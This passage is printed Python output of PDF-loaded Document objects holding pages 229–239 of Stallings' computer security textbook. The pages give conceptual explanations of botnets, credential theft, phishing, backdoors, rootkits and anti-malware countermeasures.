information.\\n• Spreading new malware: Botnets are used to spread new bots. This is very easy \\nsince all bots implement mechanisms to download and execute a file via HTTP \\nor FTP . A botnet with 10,000 hosts that acts as the start base for a worm or mail \\nvirus allows very fast spreading and thus causes more harm.\\n• Installing advertisement add-ons and browser helper objects (BHOs): Botnets \\ncan also be used to gain financial advantages. This works by setting up a fake \\nwebsite with some advertisements: The operator of this website negotiates a \\ndeal with some hosting companies that pay for clicks on ads. With the help of a \\nM06_STAL0611_04_GE_C06.indd   229 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 231, 'page_label': '230'}, page_content='230  CHAPTER 6 / MAliCiouS SofTwARE\\nbotnet, these clicks can be “automated” so instantly a few thousand bots click \\non the pop-ups. This process can be further enhanced if the bot hijacks the \\nstart-page of a compromised machine so the “clicks” are executed each time \\nthe victim uses the browser.\\n• Attacking IRC chat networks: Botnets are also used for attacks against Internet \\nRelay Chat (IRC) networks. Popular among attackers is especially the so-called \\nclone attack: In this kind of attack, the controller orders each bot to connect a \\nlarge number of clones to the victim IRC network. The victim is flooded by service \\nrequests from thousands of bots or thousands of channel-joins by these cloned bots. \\nIn this way, the victim IRC network is brought down, similar to a DDoS attack.\\n• Manipulating online polls/games:  Online polls/games are getting more and \\nmore attention and it is rather easy to manipulate them with botnets. Since \\nevery bot has a distinct IP address, every vote will have the same credibility as \\na vote cast by a real person. Online games can be manipulated in a similar way.\\nRemote Control Facility\\nThe remote control facility is what distinguishes a bot from a worm. A worm propa-\\ngates itself and activates itself, whereas a bot is controlled by some form of command-\\nand-control (C&C) server network. This contact does not need to be continuous, but \\ncan be initiated periodically when the bot observes it has network access.\\nAn early means of implementing the remote control facility used an IRC server. \\nAll bots join a specific channel on this server and treat incoming messages as com -\\nmands. More recent botnets tend to avoid IRC mechanisms and use covert commu-\\nnication channels via protocols such as HTTP . Distributed control mechanisms, using \\npeer-to-peer protocols, are also used, to avoid a single point of failure.\\nOriginally these C&C servers used fixed addresses, which meant they could be \\nlocated and potentially taken over or removed by law enforcement agencies. Some \\nmore recent malware families have used techniques such as the automatic generation \\nof very large numbers of server domain names that the malware will try to contact. \\nIf one server name is compromised, the attackers can setup a new server at another \\nname they know will be tried. To defeat this requires security analysts to reverse \\nengineer the name generation algorithm, and to then attempt to gain control over all \\nof the extremely large number of possible domains. Another technique used to hide \\nthe servers is fast-flux DNS, where the address associated with a given server name is \\nfrequently changed, often every few minutes, to rotate over a large number of server \\nproxies, usually other members of the botnet. Such approaches hinder attempts by \\nlaw enforcement agencies to respond to the botnet threat.\\nOnce a communications path is established between a control module and the \\nbots, the control module can manage the bots. In its simplest form, the control module \\nsimply issues command to the bot that causes the bot to execute routines that are \\nalready implemented in the bot. For greater flexibility, the control module can issue \\nupdate commands that instruct the bots to download a file from some Internet loca-\\ntion and execute it. The bot in this latter case becomes a more general-purpose tool \\nthat can be used for multiple attacks. The control module can also collect informa -\\ntion gathered by the bots that the attacker can then exploit. One effective counter \\nmeasure against a botnet is to take-over or shutdown its C&C network. Increasing \\ncooperation and coordination between law enforcement agencies in a number of \\nM06_STAL0611_04_GE_C06.indd   230 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 232, 'page_label': '231'}, page_content='6.8 / PAYloAD—iNfoRMATioN THEfT—KEYloGGERS,  PHiSHiNG, SPYwARE  231\\ncountries resulted in a growing number of successful C&C seizures in recent years \\n[SYMA16], and the consequent suppression of their associated botnets. These actions \\nalso resulted in criminal charges on a number of people associated with them.\\n 6.8 PAYLOAD—INFORMATION THEFT—KEYLOGGERS, \\n PHISHING, SPYWARE\\nWe now consider payloads where the malware gathers data stored on the infected \\nsystem for use by the attacker. A common target is the user’s login and password \\ncredentials to banking, gaming, and related sites, which the attacker then uses to \\nimpersonate the user to access these sites for gain. Less commonly, the payload may \\ntarget documents or system configuration details for the purpose of reconnaissance \\nor espionage. These attacks target the confidentiality of this information.\\nCredential Theft, Keyloggers, and Spyware\\nTypically, users send their login and password credentials to banking, gaming, and \\nrelated sites over encrypted communication channels (e.g., HTTPS or POP3S), which \\nprotect them from capture by monitoring network packets. To bypass this, an attacker \\ncan install a keylogger, which captures keystrokes on the infected machine to allow an \\nattacker to monitor this sensitive information. Since this would result in the attacker \\nreceiving a copy of all text entered on the compromised machine, keyloggers typically \\nimplement some form of filtering mechanism that only returns information close to \\ndesired keywords (e.g., “login” or “password” or “paypal.com”).\\nIn response to the use of keyloggers, some banking and other sites switched to \\nusing a graphical applet to enter critical information, such as passwords. Since these \\ndo not use text entered via the keyboard, traditional keyloggers do not capture this \\ninformation. In response, attackers developed more general spyware payloads, which \\nsubvert the compromised machine to allow monitoring of a wide range of activity on \\nthe system. This may include monitoring the history and content of browsing activ -\\nity, redirecting certain webpage requests to fake sites controlled by the attacker, and \\ndynamically modifying data exchanged between the browser and certain websites \\nof interest, all of which can result in significant compromise of the user’s personal \\ninformation.\\nThe Zeus banking Trojan, created from its crimeware toolkit, is a prominent \\nexample of such spyware that has been widely deployed [BINS10]. It steals banking \\nand financial credentials using both a keylogger and capturing and possibly altering \\nform data for certain websites. It is typically deployed using either spam e-mails or \\nvia a compromised website in a “drive-by-download.”\\nPhishing and Identity Theft\\nAnother approach used to capture a user’s login and password credentials is to \\ninclude a URL in a spam e-mail that links to a fake website controlled by the attacker, \\nbut which mimics the login page of some banking, gaming, or similar site. This is nor-\\nmally included in some message suggesting that urgent action is required by the user \\nto authenticate their account, to prevent it being locked. If the user is careless, and \\ndoes not realize that they are being conned, then following the link and supplying the \\nM06_STAL0611_04_GE_C06.indd   231 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 233, 'page_label': '232'}, page_content='232  CHAPTER 6 / MAliCiouS SofTwARE\\nrequested details will certainly result in the attackers exploiting their account using \\nthe captured credentials.\\nMore generally, such a spam e-mail may direct a user to a fake website con -\\ntrolled by the attacker, or to complete some enclosed form and return to an e-mail \\naccessible to the attacker, which is used to gather a range of private, personal, infor-\\nmation on the user. Given sufficient details, the attacker can then “assume” the user’s \\nidentity for the purpose of obtaining credit, or sensitive access to other resources. This \\nis known as a phishing attack and exploits social engineering to leverage user’s trust \\nby masquerading as communications from a trusted source [GOLD10].\\nSuch general spam e-mails are typically widely distributed to very large num -\\nbers of users, often via a botnet. While the content will not match appropriate trusted \\nsources for a significant fraction of the recipients, the attackers rely on it reaching \\nsufficient users of the named trusted source, a gullible portion of whom will respond, \\nfor it to be profitable.\\nA more dangerous variant of this is the spear-phishing attack. This again is an \\ne-mail claiming to be from a trusted source, but containing malicious attachments \\ndisguised as fake invoices, office documents, or other expected content. However, the \\nrecipients are carefully researched by the attacker, and each e-mail is carefully crafted \\nto suit its recipient specifically, often quoting a range of information to convince them \\nof its authenticity. This greatly increases the likelihood of the recipient responding as \\ndesired by the attacker. This type of attack is particularly used in industrial and other \\nforms of espionage, or in financial fraud such as bogus wire-transfer authorizations, \\nby well-resourced organizations. Whether as a result of phishing, drive-by-download, \\nor direct hacker attack, the number of incidents, and the quantity of personal records \\nexposed, continues to grow. For example, the Anthem medical data breach in January \\n2015 exposed more than 78 million  personal information records that could poten-\\ntially be used for identity theft. The well-resourced Black Vine cyber-espionage group \\nis thought responsible for this attack [SYMA16].\\nReconnaissance, Espionage, and Data Exfiltration\\nCredential theft and identity theft are special cases of a more general reconnais -\\nsance payload, which aims to obtain certain types of desired information and return \\nthis to the attacker. These special cases are certainly the most common; however, \\nother targets are known. Operation Aurora in 2009 used a Trojan to gain access to \\nand potentially modify source code repositories at a range of high tech, security, \\nand defense contractor companies [SYMA16]. The Stuxnet worm discovered in 2010 \\nincluded capture of hardware and software configuration details in order to deter -\\nmine whether it had compromised the specific desired target systems. Early versions \\nof this worm returned this same information, which was then used to develop the \\nattacks deployed in later versions [CHEN11, KUSH13]. There are a number of other \\nhigh-profile examples of mass record exposure. These include the Wikileaks leak of \\nsensitive military and diplomatic documents by Chelsea (born Bradley) Manning \\nin 2010, and the release of information on NSA surveillance programs by Edward \\nSnowden in 2013. Both of these are examples of insiders exploiting their legitimate \\naccess rights to release information for ideological reasons. And both resulted in \\nsignificant global discussion and debate on the consequences of these actions. In \\ncontrast, the 2015 release of personal information on the users of the Ashley Madison \\nM06_STAL0611_04_GE_C06.indd   232 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 234, 'page_label': '233'}, page_content='6.9 / PAYloAD—STEAlTHiNG—BACKDooRS, RooTKiTS  233\\nadult website, and the 2016 Panama Papers leak of millions of documents relating to \\noff-shore entities used as tax havens in at least some cases, are thought to have been \\ncarried out by outside hackers attacking poorly secured systems. Both have resulted \\nin serious consequences for some of the people named in these leaks.\\nAPT attacks may result in the loss of large volumes of sensitive information, \\nwhich is sent, exfiltrated from the target organization, to the attackers. To detect and \\nblock such data exfiltration requires suitable “data-loss” technical counter measures \\nthat manage either access to such information, or its transmission across the organi-\\nzation’s network perimeter.\\n 6.9 PAYLOAD—STEALTHING—BACKDOORS, ROOTKITS\\nThe final category of payload we discuss concerns techniques used by malware to \\nhide its presence on the infected system, and to provide covert access to that system. \\nThis type of payload also attacks the integrity of the infected system.\\nBackdoor\\nA backdoor, also known as a trapdoor, is a secret entry point into a program that \\nallows someone who is aware of the backdoor to gain access without going through \\nthe usual security access procedures. Programmers have used backdoors legitimately \\nfor many years to debug and test programs; such a backdoor is called a maintenance \\nhook. This usually is done when the programmer is developing an application that \\nhas an authentication procedure, or a long setup, requiring the user to enter many \\ndifferent values to run the application. To debug the program, the developer may \\nwish to gain special privileges or to avoid all the necessary setup and authentica -\\ntion. The programmer may also want to ensure that there is a method of activating \\nthe program should something be wrong with the authentication procedure that is \\nbeing built into the application. The backdoor is code that recognizes some special \\nsequence of input or is triggered by being run from a certain user ID or by an unlikely \\nsequence of events.\\nBackdoors become threats when unscrupulous programmers use them to gain \\nunauthorized access. The backdoor was the basic idea for the vulnerability portrayed \\nin the 1983 movie War Games. Another example is that during the development of \\nMultics, penetration tests were conducted by an Air Force “tiger team” (simulating \\nadversaries). One tactic employed was to send a bogus operating system update to \\na site running Multics. The update contained a Trojan horse that could be activated \\nby a backdoor and that allowed the tiger team to gain access. The threat was so \\n well-implemented that the Multics developers could not find it, even after they were \\ninformed of its presence [ENGE80].\\nIn more recent times, a backdoor is usually implemented as a network service \\nlistening on some non-standard port that the attacker can connect to and issue com-\\nmands through to be run on the compromised system. The WannaCry ransomware, \\nthat we described earlier in this chapter, included such a backdoor.\\nIt is difficult to implement operating system controls for backdoors in appli -\\ncations. Security measures must focus on the program development and software \\nupdate activities, and on programs that wish to offer a network service.\\nM06_STAL0611_04_GE_C06.indd   233 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 235, 'page_label': '234'}, page_content='234  CHAPTER 6 / MAliCiouS SofTwARE\\nRootkit\\nA rootkit is a set of programs installed on a system to maintain covert access to that \\nsystem with administrator (or root)3 privileges, while hiding evidence of its presence \\nto the greatest extent possible. This provides access to all the functions and services \\nof the operating system. The rootkit alters the host’s standard functionality in a mali-\\ncious and stealthy way. With root access, an attacker has complete control of the \\nsystem and can add or change programs and files, monitor processes, send and receive \\nnetwork traffic, and get backdoor access on demand.\\nA rootkit can make many changes to a system to hide its existence, making \\nit difficult for the user to determine that the rootkit is present and to identify what \\nchanges have been made. In essence, a rootkit hides by subverting the mechanisms \\nthat monitor and report on the processes, files, and registries on a computer.\\nA rootkit can be classified using the following characteristics:\\n• Persistent: Activates each time the system boots. The rootkit must store code \\nin a persistent store, such as the registry or file system, and configure a method \\nby which the code executes without user intervention. This means it is easier to \\ndetect, as the copy in persistent storage can potentially be scanned.\\n• Memory based: Has no persistent code and therefore cannot survive a reboot. \\nHowever, because it is only in memory, it can be harder to detect.\\n• User mode: Intercepts calls to APIs (application program interfaces) and modi-\\nfies returned results. For example, when an application performs a directory \\nlisting, the return results do not include entries identifying the files associated \\nwith the rootkit.\\n• Kernel mode: Can intercept calls to native APIs in kernel mode. 4 The rootkit \\ncan also hide the presence of a malware process by removing it from the  kernel’s \\nlist of active processes.\\n• Virtual machine based: This type of rootkit installs a lightweight virtual machine \\nmonitor, then runs the operating system in a virtual machine above it. The root-\\nkit can then transparently intercept and modify states and events occurring in \\nthe virtualized system.\\n• External mode: The malware is located outside the normal operation mode of \\nthe targeted system, in BIOS or system management mode, where it can directly \\naccess hardware.\\nThis classification shows a continuing arms race between rootkit authors, who exploit \\never more stealthy mechanisms to hide their code, and those who develop mecha -\\nnisms to harden systems against such subversion, or to detect when it has occurred. \\nMuch of this advance is associated with finding “layer-below” forms of attack. The \\nearly rootkits worked in user mode, modifying utility programs and libraries in order \\n3On UNIX systems, the administrator, or superuser, account is called root; hence the term root access.\\n4The kernel is the portion of the OS that includes the most heavily used and most critical portions of \\nsoftware. Kernel mode is a privileged mode of execution reserved for the kernel. Typically, kernel mode \\nallows access to regions of main memory that are unavailable to processes executing in a less-privileged \\nmode, and also enables execution of certain machine instructions that are restricted to the kernel mode.\\nM06_STAL0611_04_GE_C06.indd   234 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 236, 'page_label': '235'}, page_content='6.9 / PAYloAD—STEAlTHiNG—BACKDooRS, RooTKiTS  235\\nto hide their presence. The changes they made could be detected by code in the \\n kernel, as this operated in the layer below the user. Later-generation rootkits used \\nmore stealthy techniques, as we will discuss next.\\nKernel Mode Rootkits\\nThe next generation of rootkits moved down a layer, making changes inside the \\nkernel and co-existing with the operating systems code, in order to make their detec-\\ntion much harder. Any “anti-virus” program would now be subject to the same “low-\\nlevel” modifications that the rootkit uses to hide its presence. However, methods were \\ndeveloped to detect these changes.\\nPrograms operating at the user level interact with the kernel through system \\ncalls. Thus, system calls are a primary target of kernel-level rootkits to achieve con-\\ncealment. As an example of how rootkits operate, we look at the implementation of \\nsystem calls in Linux. In Linux, each system call is assigned a unique syscall number. \\nWhen a user-mode process executes a system call, the process refers to the system call \\nby this number. The kernel maintains a system call table with one entry per system \\ncall routine; each entry contains a pointer to the corresponding routine. The syscall \\nnumber serves as an index into the system call table.\\n[LEVI06] lists three techniques that can be used to change system calls:\\n• Modify the system call table: The attacker modifies selected syscall addresses \\nstored in the system call table. This enables the rootkit to direct a system call \\naway from the legitimate routine to the rootkit’s replacement. Figure 6.3 shows \\nhow the knark rootkit achieves this.\\n• Modify system call ta ble targets: The attacker overwrites selected legitimate \\nsystem call routines with malicious code. The system call table is not changed.\\n• Redirect the system call table:  The attacker redirects references to the entire \\nsystem call table to a new table in a new kernel memory location.\\nVirtual Machine and Other External Rootkits\\nThe latest generation of rootkits uses code that is entirely invisible to the targeted \\noperating system. This can be done using a rogue or compromised virtual machine \\nFigure 6.3 System Call Table Modification by Rootkit\\n(a) Normal kernel memory layout (b) After knark install\\nfork entry\\nsys_fork( )\\nsys_read( )\\nsys_execve( )\\nsys_chdir( )\\nread entry\\nexecve entry\\nchdir entry\\nsystem call\\ntable\\nfork entry\\nsys_fork( )\\nsys_read( )\\nknark_fork( )\\nknark_read( )\\nknark_execve( )\\nsys_execve( )\\nsys_chdir( )\\nread entry\\nexecve entry\\nchdir entry\\nsystem call\\ntable\\nM06_STAL0611_04_GE_C06.indd   235 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 237, 'page_label': '236'}, page_content='236  CHAPTER 6 / MAliCiouS SofTwARE\\nmonitor or hypervisor, often aided by the hardware virtualization support provided \\nin recent processors. The rootkit code then runs entirely below the visibility of even \\nkernel code in the targeted operating system, which is now unknowingly running in \\na virtual machine, and capable of being silently monitored and attacked by the code \\nbelow [SKAP07].\\nSeveral prototypes of virtualized rootkits were demonstrated in 2006. SubVirt \\nattacked Windows systems running under either Microsoft’s Virtual PC or VMware \\nWorkstation hypervisors by modifying the boot process they used. These changes did \\nmake it possible to detect the presence of the rootkit.\\nHowever, the Blue Pill rootkit was able to subvert a native Windows Vista \\nsystem by installing a thin hypervisor below it, then seamlessly continuing execution \\nof the Vista system in a virtual machine. As it only required the execution of a rogue \\ndriver by the Vista kernel, this rootkit could install itself while the targeted system \\nwas running, and is much harder to detect. This type of rootkit is a particular threat \\nto systems running on modern processors with hardware virtualization support, but \\nwhere no hypervisor is in use.\\nOther variants exploit the System Management Mode (SMM)5 in Intel proces-\\nsors that is used for low-level hardware control, or the BIOS code used when the \\nprocessor first boots. Such code has direct access to attached hardware devices, and \\nis generally invisible to code running outside these special modes [EMBL08].\\nTo defend against these types of rootkits, the entire boot process must be secure, \\nensuring that the operating system is loaded and secured against the installation of \\nthese types of malicious code. This needs to include monitoring the loading of any \\nhypervisor code to ensure it is legitimate. We will discuss this further in Chapter 12.\\n 6.10 COUNTERMEASURES\\nWe now consider possible countermeasures for malware. These are generally known \\nas “anti-virus” mechanisms, as they were first developed to specifically target virus \\ninfections. However, they have evolved to address most of the types of malware we \\ndiscuss in this chapter.\\nMalware Countermeasure Approaches\\nThe ideal solution to the threat of malware is prevention: Do not allow malware to \\nget into the system in the first place, or block the ability of it to modify the system. \\nThis goal is, in general, nearly impossible to achieve, although taking suitable counter-\\nmeasures to harden systems and users in preventing infection can significantly reduce \\nthe number of successful malware attacks. NIST SP 800-83 suggests there are four \\nmain elements of prevention: policy, awareness, vulnerability mitigation, and threat \\nmitigation. Having a suitable policy to address malware prevention provides a basis \\nfor implementing appropriate preventative countermeasures.\\n5The System Management Mode (SMM) is a relatively obscure mode on Intel processors used for low-\\nlevel hardware control, with its own private memory space and execution environment, that is generally \\ninvisible to code running outside (e.g., in the operating system).\\nM06_STAL0611_04_GE_C06.indd   236 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 238, 'page_label': '237'}, page_content='6.10 / CouNTERMEASuRES  237\\nOne of the first countermeasures that should be employed is to ensure all \\nsystems are as current as possible, with all patches applied, in order to reduce the \\nnumber of vulnerabilities that might be exploited on the system. The next is to set \\nappropriate access controls on the applications and data stored on the system, to \\nreduce the number of files that any user can access, and hence potentially infect or \\ncorrupt, as a result of them executing some malware code. These measures directly \\ntarget the key propagation mechanisms used by worms, viruses, and some Trojans. \\nWe will discuss them further in Chapter 12 when we discuss hardening operating \\nsystems and applications.\\nThe third common propagation mechanism, which targets users in a social engi-\\nneering attack, can be countered using appropriate user awareness and training. This \\naims to equip users to be more aware of these attacks, and less likely to take actions \\nthat result in their compromise. NIST SP 800-83 provides examples of suitable aware-\\nness issues. We will return to this topic in Chapter 17 .\\nIf prevention fails, then technical mechanisms can be used to support the fol -\\nlowing threat mitigation options:\\n• Detection: Once the infection has occurred, determine that it has occurred and \\nlocate the malware.\\n• Identification: Once detection has been achieved, identify the specific malware \\nthat has infected the system.\\n• Removal: Once the specific malware has been identified, remove all traces of \\nmalware virus from all infected systems so it cannot spread further.\\nIf detection succeeds but either identification or removal is not possible, then the \\nalternative is to discard any infected or malicious files and reload a clean backup \\nversion. In the case of some particularly nasty infections, this may require a complete \\nwipe of all storage, and rebuild of the infected system from known clean media.\\nTo begin, let us consider some requirements for effective malware counter-  \\nmeasures:\\n• Generality: The approach taken should be able to handle a wide variety of attacks.\\n• Timeliness: The approach should respond quickly so as to limit the number of \\ninfected programs or systems and the consequent activity.\\n• Resiliency: The approach should be resistant to evasion techniques employed \\nby attackers to hide the presence of their malware.\\n• Minimal denial-of-service costs: The approach should result in minimal reduc-\\ntion in capacity or service due to the actions of the countermeasure software, \\nand should not significantly disrupt normal operation.\\n• Transparency: The countermeasure software and devices should not require \\nmodification to existing (legacy) OSs, application software, and hardware.\\n• Global and local co verage: The approach should be able to deal with attack \\nsources both from outside and inside the enterprise network.\\nAchieving all these requirements often requires the use of multiple approaches, in a \\ndefense-in-depth strategy.\\nM06_STAL0611_04_GE_C06.indd   237 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 239, 'page_label': '238'}, page_content='238  CHAPTER 6 / MAliCiouS SofTwARE\\nDetection of the presence of malware can occur in a number of locations. It \\nmay occur on the infected system, where some host-based “anti-virus” program is \\nrunning, monitoring data imported into the system, and the execution and behavior of \\nprograms running on the system. Or, it may take place as part of the perimeter secu-\\nrity mechanisms used in an organization’s firewall and intrusion detection systems \\n(IDS). Lastly, detection may use distributed mechanisms that gather data from both \\nhost-based and perimeter sensors, potentially over a large number of networks and \\norganizations, in order to obtain the largest scale view of the movement of malware. \\nWe now consider each of these approaches in more detail.\\nHost-Based Scanners and Signature-Based Anti-Virus\\nThe first location where anti-virus software is used is on each end system. This gives \\nthe software the maximum access to information on not only the behavior of the \\nmalware as it interacts with the targeted system, but also the smallest overall view of \\nmalware activity. The use of anti-virus software on personal computers is now wide-\\nspread, in part caused by the explosive growth in malware volume and activity. This \\nsoftware can be regarded as a form of host-based intrusion detection system, which \\nwe will discuss more generally in Section 8.4. Advances in virus and other malware \\ntechnology, and in anti-virus technology and other countermeasures, go hand in hand. \\nEarly malware used relatively simple and easily detected code, and hence could be \\nidentified and purged with relatively simple anti-virus software packages. As the \\nmalware arms race has evolved, both the malware code and, necessarily, anti-virus \\nsoftware have grown more complex and sophisticated.\\n[STEP93] identifies four generations of anti-virus software:\\n• First generation: simple scanners\\n• Second generation: heuristic scanners\\n• Third generation: activity traps\\n• Fourth generation: full-featured protection\\nA first-generation scanner requires a malware signature to identify the malware. \\nThe signature may contain “wildcards” but matches essentially the same structure \\nand bit pattern in all copies of the malware. Such signature-specific scanners are \\nlimited to the detection of known malware. Another type of first-generation scanner \\nmaintains a record of the length of programs and looks for changes in length as a \\nresult of virus infection.\\nA second-generation scanner does not rely on a specific signature. Rather, the \\nscanner uses heuristic rules to search for probable malware instances. One class of \\nsuch scanners looks for fragments of code that are often associated with malware. \\nFor example, a scanner may look for the beginning of an encryption loop used in a \\npolymorphic virus and discover the encryption key. Once the key is discovered, the \\nscanner can decrypt the malware to identify it, then remove the infection and return \\nthe program to service.\\nAnother second-generation approach is integrity checking. A checksum can \\nbe appended to each program. If malware alters or replaces some program without \\nchanging the checksum, then an integrity check will catch this change. To counter mal-\\nware that is sophisticated enough to change the checksum when it alters a program, \\nM06_STAL0611_04_GE_C06.indd   238 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 240, 'page_label': '239'}, page_content='6.10 / CouNTERMEASuRES  239\\nan encrypted hash function can be used. The encryption key is stored separately from \\nthe program so the malware cannot generate a new hash code and encrypt that. By \\nusing a hash function rather than a simpler checksum, the malware is prevented from \\nadjusting the program to produce the same hash code as before. If a protected list \\nof programs in trusted locations is kept, this approach can also detect attempts to \\nreplace or install rogue code or programs in these locations.\\nThird-generation programs are memory-resident programs that identify mal -\\nware by its actions rather than its structure in an infected program. Such programs \\nhave the advantage that it is not necessary to develop signatures and heuristics for \\na wide array of malware. Rather, it is necessary only to identify the small set of \\nactions that indicate malicious activity is being attempted and then to intervene. \\nThis approach uses dynamic analysis techniques, such as those we will discuss in the \\nnext sections.\\nFourth-generation products are packages consisting of a variety of anti-virus \\ntechniques used in conjunction. These include scanning and activity trap components. \\nIn addition, such a package includes access control capability, which limits the ability \\nof malware to penetrate a system and then limits the ability of a malware to update \\nfiles in order to propagate.\\nThe arms race continues. With fourth-generation packages, a more comprehen-\\nsive defense strategy is employed, broadening the scope of defense to more general-\\npurpose computer security measures. These include more sophisticated anti-virus \\napproaches.\\nsandbox analysis One method of detecting and analyzing malware involves run-\\nning potentially malicious code in an emulated sandbox or on a virtual machine. \\nThese allow the code to execute in a controlled environment, where its behavior \\ncan be closely monitored without threatening the security of a real system. These \\nenvironments range from sandbox emulators that simulate memory and CPU of a \\ntarget system, up to full virtual machines, of the type we will discuss in Section 12.8, \\nthat replicate the full functionality of target systems, but which can easily be restored \\nto a known state. Running potentially malicious software in such environments \\nenables the detection of complex encrypted, polymorphic, or metamorphic malware. \\nThe code must transform itself into the required machine instructions, which it then \\nexecutes to perform the intended malicious actions. The resulting unpacked, trans -\\nformed, or decrypted code can then be scanned for known malware signatures, or its \\nbehavior monitored as execution continues for possibly malicious activity [EGEL12, \\nKERA16]. This extended analysis can be used to develop anti-virus signatures for \\nnew, unknown malware.\\nThe most difficult design issue with sandbox analysis is to determine how long \\nto run each interpretation. Typically, malware elements are activated soon after a pro-\\ngram begins executing, but recent malware increasingly uses evasion approaches such \\nas extended sleep to evade detection in the analysis time used by sandbox systems \\n[KERA16]. The longer the scanner emulates a particular program, the more likely \\nit is to catch any hidden malware. However, the sandbox analysis has only a limited \\namount of time and resources available, given the need to analyze large amounts of \\npotential malware.\\nAs analysis techniques improve, an arms race has developed between malware \\nauthors and defenders. Some malware checks to see if it is running in a sandbox or \\nM06_STAL0611_04_GE_C06.indd   239 10/11/17   2:51 PM'),\n",
